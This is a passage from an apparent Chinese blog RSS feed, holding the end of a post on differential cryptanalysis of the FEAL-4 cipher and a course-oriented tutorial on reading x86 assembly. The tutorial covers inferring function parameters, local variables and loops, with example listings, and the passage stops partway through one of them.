&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;possible-values-for-k5&#34;&gt;Possible Values for K5
&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;b85e6bc0 b85e6bc2 ba5e6bc0 ba5e6bc2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;借助差分分析，我们最终能获得一批子密钥候选集。与现代分组密码（AES 等）相比，FEAL-4 的轮数较少、结构也更为简洁，因此在教学和研究中非常适合用于演示差分分析思路。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结
&lt;/h2&gt;&lt;p&gt;本文详细展示了对 FEAL-4 进行差分攻击的完整流程，包括从差分路径设计、生成明文对、中间子密钥 ($K_3, K_2, K_1$) 攻击，再到最后对 $K_0, K_4, K_5$ 的逆向求解。同时也介绍了代码实现过程中的几处优化和验证方法。&lt;br&gt;
FEAL-4 算法因为较低的轮数和简单的结构为差分分析提供了便利。然而对于现代更安全、更复杂的分组算法，同样的分析思路也至关重要。本案例希望对密码学的学习者和研究者有所启发，如有任何问题或改进方案，欢迎在评论区讨论交流！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>如何快速解决反汇编问题</title>
        <link>https://nansenli.com/zh-cn/post/2024/11/disassembly/</link>
        <pubDate>Sun, 03 Nov 2024 14:21:43 +0000</pubDate>
        
        <guid>https://nansenli.com/zh-cn/post/2024/11/disassembly/</guid>
        <description>&lt;p&gt;对于 DCU 安全编程这门课的反汇编，由于题目有一定套路，使用固定的解题思路，可以快速解题&lt;/p&gt;
&lt;h1 id=&#34;前置技能&#34;&gt;前置技能
&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;熟悉各种汇编命令 &lt;a class=&#34;link&#34; href=&#34;craftdocs://open?blockId=8DC79A21-6886-4C9D-BAF2-8CAB0A186B73&amp;amp;spaceId=c5e6e898-910c-6f27-fbc5-91f4c34a9511&#34; &gt;汇编指令&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;熟悉 % 和 $ 表示寄存器和立即数 &lt;a class=&#34;link&#34; href=&#34;craftdocs://open?blockId=624020ED-93E1-483B-8FA7-7D21D0B71036&amp;amp;spaceId=c5e6e898-910c-6f27-fbc5-91f4c34a9511&#34; &gt;$ 与 % 寄存器与立即数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;熟悉直接寻址和间接寻址 &lt;a class=&#34;link&#34; href=&#34;craftdocs://open?blockId=C4F438DF-5C27-4FAF-82DF-7D815FB93AD1&amp;amp;spaceId=c5e6e898-910c-6f27-fbc5-91f4c34a9511&#34; &gt;直接寻址与间接寻址&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;了解一个case &lt;a class=&#34;link&#34; href=&#34;craftdocs://open?blockId=F8D3758A-2BBE-46A0-B06A-9CB8EBC9D23E&amp;amp;spaceId=c5e6e898-910c-6f27-fbc5-91f4c34a9511&#34; &gt;C语言代码到汇编的例子&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;解题思路&#34;&gt;解题思路
&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;craftdocs://open?blockId=5FC17CD5-B366-4554-B226-D38877BAB7A4&amp;amp;spaceId=c5e6e898-910c-6f27-fbc5-91f4c34a9511&#34; &gt;找到入参个数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;craftdocs://open?blockId=8B96E2AA-7B13-4371-8DF9-37856DD028BD&amp;amp;spaceId=c5e6e898-910c-6f27-fbc5-91f4c34a9511&#34; &gt;找到局部变量个数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;craftdocs://open?blockId=F7BE55C0-B922-4724-8405-BD72D9F0C85A&amp;amp;spaceId=c5e6e898-910c-6f27-fbc5-91f4c34a9511&#34; &gt;识别循环体&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;craftdocs://open?blockId=4E432226-5F3A-411D-8479-34D681002111&amp;amp;spaceId=c5e6e898-910c-6f27-fbc5-91f4c34a9511&#34; &gt;解析剩余代码片段&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;craftdocs://open?blockId=E0AD97BA-3EFF-4498-9847-0536A7B7DABD&amp;amp;spaceId=c5e6e898-910c-6f27-fbc5-91f4c34a9511&#34; &gt;识别返回数据&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;找到入参个数&#34;&gt;找到入参个数
&lt;/h1&gt;&lt;p&gt;ebp的位置是saved frame ptr，ebp+4的位置是return address。由于题目往往是约定入参全部为int 或者 int * 类型，因此 ebp+8，ebp+c，ebp+10的位置，分别是入参的第一个参数，第二个参数，第三个参数。&lt;/p&gt;
&lt;p&gt;因此，在代码中快速浏览，寻找 0x__(%ebp) 的字样，找到最大的偏移量。&lt;code&gt;(偏移量-4)//4&lt;/code&gt; 的值就是入参的个数。&lt;/p&gt;
&lt;p&gt;例如，下面这段代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;push &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp                   &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;esp, &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp              &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sub &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;esp              &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax         &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp)        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cmp &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;jge &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax         &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;incl (&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax)                 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lea &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;incl (&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax)                 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;jmp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax              &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;leave                       &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ret                         &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们发现存在 &lt;code&gt;0x10(%ebp)&lt;/code&gt;  因此，参数个数为&lt;code&gt;（16-4）/4&lt;/code&gt; ，也就是是3个。&lt;/p&gt;
&lt;p&gt;因此我们可以写出代码的框架，如下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; b, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; c) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中 a, b, c 存在的栈的位置分别是  ebp+8，ebp+c，ebp+10&lt;/p&gt;
&lt;p&gt;注意，参数从后向前入栈，因此越接近ebp，参数在参数列表中越靠前。&lt;/p&gt;
&lt;p&gt;注意，我们这里先假设全部都是int类型，如果后续有遇到不一致的情况，我们再来修改&lt;/p&gt;
&lt;h1 id=&#34;找到局部变量个数&#34;&gt;找到局部变量个数
&lt;/h1&gt;&lt;p&gt;局部变量的个数在代码第三行，&lt;code&gt;sub $0x4, %esp&lt;/code&gt;  这里减去的数量，就是分配的局部变量的长度。&lt;/p&gt;
&lt;p&gt;在上面的代码中，显然这里分配了4字节，也就是只有一个局部变量。我们假设这个局部变量就是int类型，起名为i。&lt;/p&gt;
&lt;p&gt;我们继续扩展我们的代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; b, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; c) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;识别循环体&#34;&gt;识别循环体
&lt;/h1&gt;&lt;p&gt;循环体通常是while循环或者for循环。&lt;/p&gt;
&lt;p&gt;对于常见的&lt;code&gt;while&lt;/code&gt;命令，我们寻找下面相关的指令：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;判断入口：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;判断入口是一个连续的比较命令（如cmp）和一个跳转命令（如jge或jle）组成。找到判断入口有助于我们识别代码中是否有判断或者循环。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;循环：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;假如没有循环标志，那么就不是循环体，而是简单的if判断。循环是一个无条件的jmp命令。循环所跳转的位置就是判断条件的开始。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;判断条件：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;判断条件是判断入口以及判断入口和前面几条命令组合成的完整判断条件。判断条件就是while括号里的内容。&lt;/p&gt;
&lt;p&gt;现在我们查看下面的例子：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;push &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp                   &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;esp, &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp              &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sub &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;esp              &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax         &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp)        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cmp &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;jge &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax         &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;imul (&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax)                 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lea &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;imul (&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax)                 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;jmp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax              &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
